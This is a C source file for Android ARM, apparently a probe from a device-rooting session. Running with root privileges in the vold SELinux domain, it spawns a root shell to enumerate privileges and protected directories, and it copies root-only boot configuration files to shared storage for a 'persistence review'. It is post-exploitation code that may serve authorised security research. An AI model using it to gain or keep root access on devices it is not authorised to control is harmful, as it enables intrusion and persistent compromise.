/* session62 root_shell.c  (test: usable root shell from vold-domain root)
 *
 * Round 3. Prior probes: uid 0 / full caps / u:r:vold:s0; boot+system open RW;
 * all selinuxfs/proc-sys escalators EACCES; no modules; inet sockets EACCES.
 *
 * This test forks and execve's /system/bin/sh -c '<script>' with stdout/stderr
 * redirected to /storage/emulated/legacy/rshell_out.txt, to learn:
 *   - does execve from vold succeed (SELinux domain_trans),
 *   - what uid + domain the resulting shell has (CAP_EFF),
 *   - can it read root-only dirs/files.
 * Also copies the boot-time RC/config files for a persistence review.
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_execve      11
#define SYS_wait4       114
#define SYS_dup2        63
#define SYS_umask       60
#define SYS_clone       120

#define O_RDONLY        0
#define O_WRONLY        1
#define O_CREAT         0x40
#define O_TRUNC         0x200
#define O_APPEND        0x400

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }

static const char *OUTBASE = "/storage/emulated/legacy/";
static char logpath[128];

static void lograw(const char *msg, long n)
{
    long f = sc6(SYS_open, (long)logpath, O_WRONLY | O_CREAT | O_APPEND, 0644, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)msg, n, 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void logmsg(const char *msg) { lograw(msg, slen(msg)); }
static void loghex8(unsigned long v)
{
    char b[16]; int i = 0; b[i++] = '0'; b[i++] = 'x';
    for (int k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n'; lograw(b, i);
}
static void kvhex(const char *tag, unsigned long v) { logmsg(tag); loghex8(v); }

static long copy_path(const char *path, const char *outname, long max)
{
    char dst[192];
    scpy(dst, OUTBASE); scat(dst, outname);
    long fd = sc6(SYS_open, (long)path, O_RDONLY, 0, 0, 0, 0);
    if (fd < 0) return fd;
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { sc6(SYS_close, fd, 0, 0, 0, 0, 0); return of; }
    static char buf[65536];
    long total = 0, r;
    while (total < max) {
        long want = max - total; if (want > sizeof buf) want = sizeof buf;
        r = sc6(SYS_read, fd, (long)buf, want, 0, 0, 0);
        if (r <= 0) break;
        sc6(SYS_write, of, (long)buf, r, 0, 0, 0);
        total += r;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    return total;
}

static char shargv0[] = "/system/bin/sh";
static char shargc[]  = "-c";
static char shscript[] =
    "echo ===id===; id; "
    "echo ===ctx===; cat /proc/self/attr/current; echo; "
    "echo ===status===; grep -E 'Uid|Gid|CapEff' /proc/self/status; "
    "echo ===data-local-tmp===; ls -la /data/local/tmp 2>&1; "
    "echo ===data===; ls -la /data 2>&1; "
    "echo ===sdcard===; ls -la /storage/emulated/legacy 2>&1; "
    "echo ===df===; df 2>&1; "
    "echo ===done===";
static char *shargv[] = { shargv0, shargc, shscript, 0 };
static char env0[] = "PATH=/sbin:/system/sbin:/system/bin:/system/xbin";
static char env1[] = "LD_LIBRARY_PATH=/system/lib";
static char *sh_envp[] = { env0, env1, 0 };

void _start(void)
{
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    scpy(logpath, OUTBASE); scat(logpath, "rshell_log.txt");

    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid != 0) ex(0);

    logmsg("\nsession62 root_shell: start\n");

    /* copy boot-time config for a persistence review */
    long a;
    a = copy_path("/fstab.qcom", "rshell_fstab_qcom.txt", 8192); kvhex("fstab=", a);
    copy_path("/init.rc", "rshell_init_rc.txt", 262144);
    copy_path("/init.environ.rc", "rshell_init_environ_rc.txt", 16384);
    copy_path("/ueventd.rc", "rshell_ueventd_rc.txt", 16384);
    copy_path("/ueventd.qcom.rc", "rshell_ueventd_qcom_rc.txt", 16384);
    copy_path("/default.prop", "rshell_default_prop.txt", 4096);
    copy_path("/proc/self/mountstats", "rshell_mountstats.txt", 65536);

    /* fork + exec sh -c script, stdout/stderr -> file */
    char rout[192];
    scpy(rout, OUTBASE); scat(rout, "rshell_out.txt");
    long child = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (child == 0) {
        long fd = sc6(SYS_open, (long)rout, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
        if (fd < 0) { logmsg("rout open fail\n"); ex(0); }
        sc6(SYS_dup2, fd, 1, 0, 0, 0, 0);
        sc6(SYS_dup2, fd, 2, 0, 0, 0, 0);
        sc6(SYS_close, fd, 0, 0, 0, 0, 0);
        long e = sc6(SYS_execve, (long)shargv0, (long)shargv, (long)sh_envp, 0, 0, 0);
        /* execve returned -> failed */
        char m[] = "EXECVE SH FAILED rc=0x00000000\n";
        kvhex("execve sh rc=", (unsigned long)e);
        sc6(SYS_write, 1, (long)"EXECVE SH FAILED\n", 18, 0, 0, 0);
        ex(0);
    }
    long st = 0;
    sc6(SYS_wait4, child, (long)&st, 0, 0, 0, 0);
    kvhex("sh exit status=", (unsigned long)st);

    logmsg("session62 root_shell: done\n");
    ex(0);
}
